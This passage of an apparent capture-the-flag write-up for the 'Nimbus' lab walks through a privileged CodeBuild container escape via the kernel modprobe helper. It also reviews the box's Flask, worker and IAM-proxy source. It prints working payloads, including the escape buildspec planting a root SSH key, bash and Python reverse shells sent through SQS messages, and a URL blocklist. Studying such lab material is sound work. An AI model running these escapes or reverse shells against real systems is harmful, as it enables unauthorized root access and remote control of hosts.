All of this builds into a more complex payload:

```bash
worker@6d1b85675039:/$ cat > /tmp/create.yaml <<'EOF'
> name: 0xdf-ssh
> source:
>   type: NO_SOURCE
>   buildspec: |
>     version: 0.2
>     phases:
>       build:
>         commands:
>           - id
>           - sed -n 's/.*upperdir=\([^,]*\).*/\1/p' /proc/mounts | head -1 > /up.txt; cat /up.txt
>           - printf '#!/bin/sh\nmkdir -p /root/.ssh\necho "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" >> /root/.ssh/authorized_keys\nchmod 600 /root/.ssh/authorized_keys\n' > /x.sh
>           - chmod +x /x.sh
>           - echo "$(cat /up.txt)/x.sh" > /proc/sys/kernel/modprobe; cat /proc/sys/kernel/modprobe
>           - printf '\377\377\377\377' > /tr; chmod +x /tr; /tr 2>/dev/null || true
>           - sleep 3; echo escape-done
> artifacts:
>   type: NO_ARTIFACTS
> environment:
>   type: LINUX_CONTAINER
>   image: floci/floci:latest
>   computeType: BUILD_GENERAL1_SMALL
>   privilegedMode: true
>   environmentVariables:
>     - name: "BASH_FUNC_id%%"
>       value: '() { echo "uid=1000(worker) gid=1000(worker) groups=1000(worker)"; }'
>       type: PLAINTEXT
> serviceRole: arn:aws:iam::847219365028:role/service-role/codebuild
> EOF
```

The commands here get the name of the overlay upper dir from `mounts`. This is the path on the host that is `/` inside the container. Then it writes a script (`x.sh`) to the root of the container (which in the host will be in the upper dir) and makes it executable. This script writes my SSH key into root’s `authorized_keys` file.

`echo "$(cat /up.txt)/x.sh" > /proc/sys/kernel/modprobe` points the kernel’s module loader at my helper. This requires root and `CAP_SYS_ADMIN`, which come with the privileged container. The key to the escape is that this setting is global to the kernel, and when the kernel runs the helper, it runs it as root in the host’s namespaces, not the container’s. That’s why the path has to be the host’s path to `x.sh` in the upper dir, not `/x.sh`. This is the same idea as the cgroups `release_agent` escape I walked through in [Digging into cgroups Escape](https://0xdf.gitlab.io/2021/05/17/digging-into-cgroups.html), just with a different kernel hook.

`printf '\377\377\377\377' > /tr; chmod +x /tr; /tr 2>/dev/null || true` creates a file starting with four 0xff bytes and tries to run it. The kernel doesn’t recognize that format, so it asks `modprobe` to load a module that might handle it, which runs my `x.sh` instead.

I’ll create and build the new project:

```javascript
worker@6d1b85675039:/$ aws --endpoint-url http://floci:4566 codebuild create-project --cli-input-yaml file:///tmp/create.yaml --query 'project.name'
"0xdf-ssh"
worker@6d1b85675039:/$ aws --endpoint-url http://floci:4566 codebuild start-build --project-name 0xdf-ssh --query 'build.id'
"0xdf-ssh:1"
worker@6d1b85675039:/$ aws --endpoint-url http://floci:4566 codebuild batch-get-builds --ids 0xdf-ssh:1 --query 'builds[0].{status:buildStatus,build:phases[?phaseType==`BUILD`].{s:phaseStatus,m:contexts[0].message}}'
{
    "status": "SUCCEEDED",
    "build": [
        {
            "s": "SUCCEEDED",
            "m": null
        }
    ]
}
```

Everything shows as successful. I’m able to SSH as root:

```ruby
oxdf@hacky$ ssh -i ~/keys/ed25519_gen root@nimbus.htb
Welcome to Ubuntu 24.04.4 LTS (GNU/Linux 6.8.0-124-generic x86_64)
...[snip]...
root@nimbus:~#
```

## Beyond Root

### Website

#### Background

I’ll find the website running as an `app.py` from a folder in `/opt/nimbus`:

```ruby
root@nimbus:/opt/nimbus/webapp# ps auxww | grep app.py
root        2035  0.0  0.9  47920 38524 ?        Ss   20:12   0:02 /opt/nimbus/webapp/webapp/bin/python /opt/nimbus/webapp/app.py
```

This is actually running on the host, so I haven’t had access to the source before getting a shell as root.

`app.py` is a Python Flask application:

```python
"""Nimbus internal job scheduler"""                        
import requests                                                                                                       
import yaml                                                                                                           
from flask import Flask, request, render_template          
import subprocess                                                                                                     
import ipaddress  
import os                    
                                                           
app = Flask(__name__)  
...[snip]...
if __name__ == "__main__":
    app.run(host="127.0.0.1", port=5000, debug=False)
```

It listens on port 5000.

There’s also the custom 404 handler:

```python
@app.errorhandler(404)
def not_found(_): return render_template("404.html"), 404
```

#### Filter

The filter starts with a static list of strings:

```
_STATIC_BLOCKED = [
    "169.254",
    "127.0.0",
    "localhost",
    "0x",
    "[",
    "%",
    "metadata",
    "internal",
    "nimbus.htb",
    "floci",
]   
```

It also wants to block the DHCP IP given at boot, so it has a function that does that, `_detect_box_ip` (not shown), and a function that adds that to the blocklist:

```python
def _build_blocklist() -> list[str]:
    blocked = list(_STATIC_BLOCKED)
    box_ip = _detect_box_ip() 
    if box_ip:
        blocked.append(box_ip)
        parts = box_ip.split(".")
        if len(parts) == 4:
            blocked.append(f"{parts[0]}.{parts[1]}.{parts[2]}.")
    return blocked

BLOCKED_SUBSTRINGS = _build_blocklist()
```

A lot of the static strings I tried are here, as well as others. `0x`, `%`, and `[` block hex-encoded IPs, URL encoding, and IPv6 addresses, but there’s nothing that catches the decimal form or shortened forms like `127.1`.

The input is validated with this function:

```python
def is_blocked(url):
    lowered = url.lower()
    return any(bad in lowered for bad in BLOCKED_SUBSTRINGS)
```

If any of the block list strings are in the input, it returns `True` to block it.

#### YAML SQS Message

This application doesn’t actually send any SQS messages. It only previews the input YAML, displaying back to the user what they submitted directly or via a fetched URL:

```python
@app.route("/jobs/preview", methods=["POST"])
def preview_job():
    url = request.form.get("url", "").strip()
    yaml_body = request.form.get("yaml_body", "").strip()

    if url:
        if not (url.startswith("http://") or url.startswith("https://")):
            return render_template("preview.html",
                error="Only http:// and https:// URLs are supported.")

        valid, msg = is_valid_yaml_url(url)
        if not valid:
          return render_template("preview.html", error=msg)

        if is_blocked(url):
            return render_template("preview.html",
                error="Security policy: this URL targets an internal resource and has been blocked.")
        try:
            resp = requests.get(url, timeout=5, allow_redirects=False)
            body = resp.text
            parsed = None
            try: parsed = yaml.safe_load(body)
            except Exception: pass
            return render_template("preview.html", source="url", url=url,
                status=resp.status_code, body=body[:4000], parsed=parsed)
        except requests.exceptions.RequestException as e:
            return render_template("preview.html", error=f"Could not fetch URL.")

    if yaml_body:
        try: parsed = yaml.safe_load(yaml_body)
        except yaml.YAMLError as e:
            return render_template("preview.html", error=f"YAML parse error.")
        return render_template("preview.html", source="yaml",
            body=yaml_body[:4000], parsed=parsed,
            target_queue="nimbus-jobs", target_region="us-east-1",
            worker_image="nimbus/worker",
            target_endpoint="http://aws.nimbus.htb")

    return render_template("preview.html", error="Provide either a URL or pasted YAML.")
```

### Worker

#### Worker Configuration

The worker script in the container is responsible for taking jobs off the SQS queue and running them. The script to do that is in `/app` named `worker.py`. This is configured to run in the `docker-compose.yml` file in `/opt/nimbus` on the host (which I can access as root):

```yaml
services:
  floci:
    container_name: nimbus-floci
    image: floci/floci:latest
    restart: unless-stopped
    ports:
      - "127.0.0.1:14566:4566"
    environment:
      - FLOCI_HOSTNAME=floci
      - FLOCI_SERVICES_LAMBDA_DOCKER_NETWORK=nimbus-net
      - FLOCI_DEFAULT_REGION=us-east-1
      - FLOCI_DEFAULT_ACCOUNT_ID=847219365028
      - FLOCI_STORAGE_MODE=memory
    volumes:
      - "/var/run/docker.sock:/var/run/docker.sock"
    networks:
      - nimbus-net

  worker:
    container_name: nimbus-worker
    build: ./worker
    restart: unless-stopped
    depends_on:
      - floci
    environment:
      - AWS_ENDPOINT_URL=http://aws.nimbus.htb
      - QUEUE_URL=http://aws.nimbus.htb/847219365028/nimbus-jobs
      - AWS_DEFAULT_REGION=us-east-1
      - AWS_ACCESS_KEY_ID=AKIA7P3R9X4K8M2L5VHN
      - AWS_SECRET_ACCESS_KEY=dM4nV/q8Hf7LcRpZ2eY1KjBxN5Aozs3T6gU9JfWh
    extra_hosts:
      - "aws.nimbus.htb:172.18.0.1"
      - "nimbus.htb:172.18.0.1"
    networks:
      - nimbus-net

networks:
  nimbus-net:
    name: nimbus-net
    driver: bridge
```

The `floci` container has the host’s Docker socket mounted into it. That’s how Floci launches CodeBuild containers on the host’s Docker daemon, and why a privileged build container was a path to the host.

`worker` ’s `build` parameter says to look in a folder named `worker`, where I’ll find a `Dockerfile`:

```dockerfile
FROM python:3.11-slim
RUN apt-get update && apt-get install -y --no-install-recommends \
        awscli curl procps iputils-ping less openssh-client zip \
    && rm -rf /var/lib/apt/lists/*
WORKDIR /app
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt
COPY worker.py .
RUN useradd -m -s /bin/bash worker && chown -R worker /app
USER worker
CMD ["python3", "-u", "worker.py"]
```

That container’s main executable is `worker.py`. I can also see that it is PID 1 inside the container:

```
worker@6d1b85675039:/$ ps auxww | grep worker.py
worker         1  0.0  1.0  48796 41084 ?        Ss   20:12   0:00 python3 -u worker.py
```

#### Worker Source

The actual code is:

```python
"""Nimbus job worker. Polls SQS, parses messages with yaml.load (vulnerable)."""
import os, time, subprocess, boto3, yaml

ENDPOINT  = os.environ.get("AWS_ENDPOINT_URL", "http://aws.nimbus.htb")
QUEUE_URL = os.environ.get("QUEUE_URL", "http://aws.nimbus.htb/000000000000/nimbus-jobs")
REGION    = os.environ.get("AWS_DEFAULT_REGION", "us-east-1")
POLL_SECS = 5

print(f"[worker] starting; endpoint={ENDPOINT} queue={QUEUE_URL}", flush=True)
sqs = boto3.client("sqs", endpoint_url=ENDPOINT, region_name=REGION)

def handle_message(body):
    print(f"[worker] received message ({len(body)} bytes)", flush=True)
    job = yaml.load(body, Loader=yaml.Loader)  # vulnerable
    if not isinstance(job, dict):
        print("[worker] message did not parse to a dict, skipping", flush=True)
        return
    name = job.get("name", "<unnamed>")
    script = job.get("script", "")
    print(f"[worker] running job '{name}'", flush=True)
    if script:
        result = subprocess.run(["python3", "-c", script],
            capture_output=True, text=True, timeout=30)
        print(f"[worker] stdout: {result.stdout}", flush=True)
        if result.stderr: print(f"[worker] stderr: {result.stderr}", flush=True)

def main():
    while True:
        try:
            resp = sqs.receive_message(QueueUrl=QUEUE_URL,
                MaxNumberOfMessages=1, WaitTimeSeconds=POLL_SECS)
            for m in resp.get("Messages", []):
                try: handle_message(m["Body"])
                except Exception as e: print(f"[worker] error: {e}", flush=True)
                finally:
                    sqs.delete_message(QueueUrl=QUEUE_URL, ReceiptHandle=m["ReceiptHandle"])
        except Exception as e:
            print(f"[worker] poll error: {e}", flush=True)
            time.sleep(POLL_SECS)

if __name__ == "__main__":
    main()
```

The comments in this code talk about how vulnerable it is (pretty lazy on HTB’s part). It’s got a main function that runs an infinite loop, long polling the queue for up to 5 seconds at a time, and passing each message body to `handle_message`.

`handle_message` parses the body using `yaml.load`, and then passes the `script` parameter to `subprocess.run` as `python3 -c <script>`.

#### YAML Deserialization

The YAML deserialization issue comes from the call to `yaml.load`:

```
    job = yaml.load(body, Loader=yaml.Loader)  # vulnerable
```

Whatever AI wrote this code was nice enough to label it as vulnerable. PyYAML’s `yaml.Loader` will construct arbitrary Python objects, which allows for the kind of exploits I did to get a shell. Older versions of PyYAML used this loader by default. Since version 6.0, `yaml.load` requires an explicit `Loader`, but this code asks for the unsafe one. The correct way to call this would be with `yaml.safe_load`.

It’s also pretty lame of this box to say on the website that it uses `safe_load` in a way that no real application author would and then not do so.

#### Direct RCE

Knowing how the script parameter is used, I can skip the deserialization and just send a message with a `script` argument:

```cpp
oxdf@hacky$ aws --profile nimbus sqs send-message --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body 'name: nightly-db-backup
‍script: import os; os.system("bash -c \"bash -i >& /dev/tcp/10.10.15.169/443 0>&1\"")'
{
    "MD5OfMessageBody": "6e33ec0fe4463a313585d4c7f1e9097c",
    "MessageId": "38bfbd6a-5bb0-4327-85a2-1402dc175269"
}
```

This returns a shell!

I’m a bit surprised this doesn’t die after 30 seconds because of how it’s run in the worker:

```toml
        result = subprocess.run(["python3", "-c", script],
            capture_output=True, text=True, timeout=30)
```

At least for this payload it lives. If I try a Python reverse shell:

```cpp
oxdf@hacky$ aws --profile nimbus sqs send-message --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body 'name: nightly-db-backup
‍script: import socket, subprocess, os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.15.169",443)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); import pty; pty.spawn("sh")'
{
    "MD5OfMessageBody": "3f49a821c5c08c9e5ef49f4084ecd513",
    "MessageId": "ac1be891-c4bb-4d87-bd8e-be7371062a5a"
}
```

This one does die after 30 seconds. The difference is in how the payloads run. The timeout kills only the direct `python3` child, not its descendants. The `bash` payload hands the socket to a separate, detached process, so it outlives `python3`. The Python payload keeps the shell’s I/O inside python itself, so it dies with `python3`.

#### YAML Parsing JSON

I learned doing this box that `yaml.load` (and `yaml.safe_load`) will handle JSON data as well. YAML’s flow style uses `{}` and `[]` just like JSON, so for practical purposes JSON is valid YAML. For example:

```python
oxdf@hacky$ uv run --with pyyaml python
Installed 1 package in 8ms
Python 3.13.7 (main, Sep 18 2025, 19:47:49) [Clang 20.1.4 ] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> import yaml
>>> jstr = '{"a": 223, "b": "0xdf"}'
>>> data = yaml.load(jstr, Loader=yaml.Loader)
>>> data
{'a': 223, 'b': '0xdf'}
>>> data['a']
223
>>> data2 = yaml.safe_load(jstr)
>>> data2
{'a': 223, 'b': '0xdf'}
```

That means I can make a simpler payload to the queue without having to worry about the whitespace YAML requires. Nested quotes are an issue, so I’ll create a `shell.json`:

```json
{
    "name": "nightly-db-backup", 
    "script": "import os; os.system('bash -c \"bash -i >& /dev/tcp/10.10.15.169/443 0>&1\"')"
}
```

Now I can reference it from the command:

```css
oxdf@hacky$ aws --profile nimbus sqs send-message --queue-url http://floci:4566/847219365028/nimbus-jobs --message-body file://./shell.json
{
    "MD5OfMessageBody": "648894d150483a6a8d1b9d555ff3a6f9",
    "MessageId": "c4c4ae2d-a096-42c5-b1cc-36ec60a89bed"
}
```

That works!

### AWS Auth Proxy

#### Nginx Config

I suspected the auth was being handled by something in front of Floci. The Nginx configuration in `/etc/nginx/sites-enabled/nimbus` shows where:

```nginx
server {
    listen 10.129.245.218:80 default_server;
    listen 127.0.0.1:80 default_server;
    listen 172.18.0.1:80 default_server;
    server_name _;
    return 301 http://nimbus.htb$request_uri;
}

server {
    listen 10.129.245.218:80;
    listen 127.0.0.1:80;
    listen 172.18.0.1:80;
    server_name nimbus.htb;
    location / {
        proxy_pass         http://127.0.0.1:5000;
        proxy_set_header   Host $host;
        proxy_set_header   X-Forwarded-For $remote_addr;
        proxy_read_timeout 30s;
    }
}

server {
    listen 10.129.245.218:80;
    listen 127.0.0.1:80;
    listen 172.18.0.1:80;
    server_name aws.nimbus.htb;
    client_max_body_size 50M;
    location / {
        proxy_pass         http://127.0.0.1:9090;
        proxy_set_header   Host $host;
        proxy_set_header   X-Real-IP $remote_addr;
        proxy_set_header   X-Forwarded-For $remote_addr;
        proxy_read_timeout 120s;
        proxy_send_timeout 120s;
    }
}
```

There are three servers. The default case is to redirect to `nimbus.htb`. The second server is `nimbus.htb`, and it proxies to `localhost:5000`, which is the web app I looked at [above](#nimbushtb---tcp-80).

The third server is the interesting one. `aws.nimbus.htb` proxies to `localhost:9090`. That’s a Python process:

```
root@nimbus:/# sudo netstat -tnlp | grep 9090
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN      2084/python 
```

It’s another Python script in `/opt/nimbus` named `iam-proxy.py`:

```swift
root@nimbus:/# ps auxww | grep 2084
root        2084  0.0  0.9 195088 38472 ?        Ssl  Nov11   0:10 /opt/nimbus/iam-proxy/proxy/bin/python /opt/nimbus/iam-proxy/iam-proxy.py
```

#### iam-proxy.py

This script is another Flask webserver with a lot of functions, but only one Flask route that handles all requests:

```python
import re
import logging
import xml.sax.saxutils as saxutils
import requests
from flask import Flask, request, Response

FLOCI_URL = "http://localhost:14566"
PROXY_PORT = 9090
LOG_LEVEL = logging.INFO

ACCESS_KEYS = {
    "ASIAQX4PG7L2K9M3N5R8":   "nimbus-web-role",
    "AKIA7P3R9X4K8M2L5VHN":   "nimbus-worker-role",
}

PERMISSIONS = {
    "nimbus-web-role": [
...[snip]...
    ],
    "nimbus-worker-role": [
...[snip]...
    ],
}

IDENTITY = {
    "nimbus-web-role": {
        "Arn":     "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a",
        "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
        "Account": "847219365028",
    },
    "nimbus-worker-role": {
        "Arn":     "arn:aws:sts::847219365028:assumed-role/nimbus-worker-role/worker",
        "UserId": "AROA7P3R9X4K8M2L5VHNT:worker",
        "Account": "847219365028",
    },
}

app = Flask(__name__)
logging.basicConfig(level=LOG_LEVEL, format="[proxy] %(message)s")
log = logging.getLogger("nimbus-proxy")

def extract_role_from_request(req) -> str | None:
...[snip]...

def identify_action(req) -> tuple[str, str, str]:
...[snip]...

def _looks_like_s3(path: str, req) -> bool:
...[snip]...

def _classify_s3(method, path, req):
...[snip]...

def _classify_lambda(method, fname, subpath):
...[snip]...

def _extract_resource_from_form(req, action):
...[snip]...

def _extract_resource_from_json(req, action):
...[snip]...

def _guess_service_from_host(host, path):
...[snip]...

def _guess_service_from_action(action: str) -> str:
...[snip]...

def _matches(pattern: str, resource: str) -> bool:
...[snip]...

def is_allowed(role: str, service: str, action: str, resource: str) -> bool:
...[snip]...

def forward_to_floci(path):
...[snip]...

def sts_caller_identity_response(role: str) -> Response:
...[snip]...

def access_denied(role: str | None, service: str, action: str, resource: str) -> Response:
...[snip]...

def invalid_token() -> Response:
...[snip]...

@app.route("/", defaults={"path": ""}, methods=["GET", "POST", "PUT", "DELETE", "HEAD"])
@app.route("/<path:path>", methods=["GET", "POST", "PUT", "DELETE", "HEAD"])
def proxy(path):
...[snip]...

if __name__ == "__main__":
    log.info(f"IAM proxy listening on 127.0.0.1:{PROXY_PORT}, forwarding to {FLOCI_URL}")
    app.run(host="127.0.0.1", port=PROXY_PORT, debug=False, threaded=True)
```

It hard-codes the two keys I interacted with and uses those to allocate or deny permission to various assets using a hard-coded access list:

```python
PERMISSIONS = {
  "nimbus-web-role":    [ ("sqs","SendMessage","nimbus-jobs"), ("sqs","GetQueueUrl","nimbus-jobs"),
                          ("sqs","ListQueues","*"), ("sts","GetCallerIdentity","*"), ... ],
  "nimbus-worker-role": [ ("sqs","ReceiveMessage","nimbus-jobs"), ("sqs","DeleteMessage","nimbus-jobs"),
                          ("sts","GetCallerIdentity","*"), ... ],
}
```

If the request is allowed, it generates the same request to Floci using the `requests` library and then sends back the response:

```python
def forward_to_floci(path):                                
    fwd_headers = {
        k: v for k, v in request.headers.items()
        if k.lower() not in EXCLUDED_FORWARD_HEADERS
    }

    upstream = requests.request(
        method=request.method,
        url=f"{FLOCI_URL}/{path}",                         
        headers=fwd_headers,
        params=request.args,
        data=request.get_data(),
        cookies=request.cookies,
        allow_redirects=False,
        timeout=60,
    )

    response_headers = [
        (name, value) for (name, value) in upstream.headers.items()
        if name.lower() not in EXCLUDED_RESPONSE_HEADERS
    ]
    return Response(upstream.content, upstream.status_code, response_headers)
```

The secret is never used, just the access key. The request signature is never checked, so anyone who knows an access key ID can act as that role with any secret.
